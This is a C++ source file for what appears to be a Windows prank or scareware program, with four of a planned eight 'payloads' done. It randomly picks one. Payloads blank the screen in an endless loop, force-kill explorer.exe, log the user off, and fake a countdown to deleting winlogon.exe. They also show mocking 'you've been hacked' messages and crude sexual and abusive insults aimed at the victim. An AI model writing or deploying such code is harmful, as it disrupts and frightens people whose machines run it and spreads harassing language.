#define _WIN32_WINNT 0x0500
#include <iostream>
#include <time.h>
#include <Windows.h>
#include <wingdi.h>
#include <winuser.h>
#include <fstream>
#include "payloads.h"

// Progress: 4/8 Payloads Done

namespace payloadLib{
    int payloadClass::generatePayload(){
        int payloadId = 0;
        time_t currtimet = 0;
        struct tm *currtm;
        std::fstream file;
        std::string out;
        srand(time(0));

        file.open("conf", std::ios::in);

        if(file.is_open()){
            file >> out;
            payloadId = atoi(out.c_str());
            file.close();
        }
        file.open("conf", std::ios::out);
        file << rand() % 4;
        file.close();

        currtimet = time(0);
        currtm = localtime(&currtimet);

        if(currtm->tm_sec / 30) payloadId += 4;

        return payloadId;
    }

    void payloadClass::payload0(){
        //////////////
        // BLACKOUT //
        //////////////

        HWND hWnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hWnd);

        HBRUSH brush = CreateSolidBrush(RGB(0,0,0));
        RECT res;
        GetWindowRect(hWnd, &res);

        RECT rct;
        rct.left = 0;
        rct.top = 0;
        rct.right = res.right;
        rct.bottom = res.bottom;

        while(1) {
            FillRect(hdc,&rct,brush);
            Sleep(1000/60);
        }
    }

    void payloadClass::payload1(){
        ///////////////////////
        // BYE-BYE EXPLORER! //
        ///////////////////////

        FreeConsole();
        system("taskkill /f /im explorer.exe");
        MessageBox(
           NULL,
           (LPCSTR)"HAHA, looks like Your Desktop and Taskbar are GONE!\nthats right, YOUVE BEEN HAXXED! the all-mighty batch skr1pt_k1dd133 strikes AGAIN! HAVE FUN!",
           (LPCSTR)"batch skr1pt_k1dd133 ATTACK!",
           MB_OK | MB_ICONEXCLAMATION
        );
    }

    void payloadClass::payload2(){
        ////////////////
        // SMALL COCK //
        ////////////////

        FreeConsole();
        int hasSmallCock;
        hasSmallCock = MessageBox(
           NULL,
           (LPCSTR)"You have a Small Cock!\nAdmit it!",
           (LPCSTR)"Small Cock alert!",
           MB_YESNO | MB_ICONQUESTION
        );
        if(hasSmallCock == IDYES){
            MessageBox(
                NULL,
                (LPCSTR)"Great! Take this Cock-growing Apple and Eat it!",
                (LPCSTR)"No more Small Cock alert",
                MB_ICONINFORMATION
            );
        }else{
            MessageBox(
                NULL,
                (LPCSTR)"I know you have a small cock. Stop lying you little piece of shit whose father left them to get the Milk.\n"
                        "Oh, and you're probably an obese discord mod who plays Genshin Impact! TOUCH SOME FUCKING GRASS!!!",
                (LPCSTR)"Discord Mod ALERT!",
                MB_ICONINFORMATION
            );
            ExitWindowsEx(0, 0);
        }
    }

    void payloadClass::payload3(){
        ///////////////////////
        // VBS SKRIPT KIDDIE //
        ///////////////////////

        //FreeConsole();
        srand(time(0));
        std::string msg = "Hello its me, the vbs skr1pt_k1dd133!\nGuess what, ill now DESTROY YOUR PC! GET WRECKED\b \bT!!!\n\nDELETING 'WINLOGON.EXE' in ...\n3        \n2        \n1        ";
        //ShellExecute(0,0,"notepad.exe",0,0,SW_SHOWDEFAULT);
        Sleep(666);
        system("taskkill /f /im explorer.exe > nul");

        /*INPUT inputs[1];
        ZeroMemory(inputs, sizeof(inputs));
        char c = 0;*/

        for(int i=0;i<msg.length();i++){
            /*c = msg[i];
            bool shiftFlag = false;

            switch(c){
            case '_':
                c = VK_SHIFT;
                shiftFlag = true;
            }

            inputs[0].type = INPUT_KEYBOARD;
            inputs[0].ki.wVk = c;
            inputs[0].ki.dwFlags = 0;
            SendInput(1, inputs, sizeof(INPUT));

            inputs[0].type = INPUT_KEYBOARD;
            inputs[0].ki.wVk = c;
            inputs[0].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, inputs, sizeof(INPUT));*/

            std::cout << msg[i];

            Sleep( 50 + ( rand() % 151 ) );
        }

        MessageBox(
            NULL,
            (LPCSTR)"YOUR PC IS NOW WRECKET!",
            (LPCSTR)"BYE BYE!",
            MB_ICONERROR
        );
    }
}
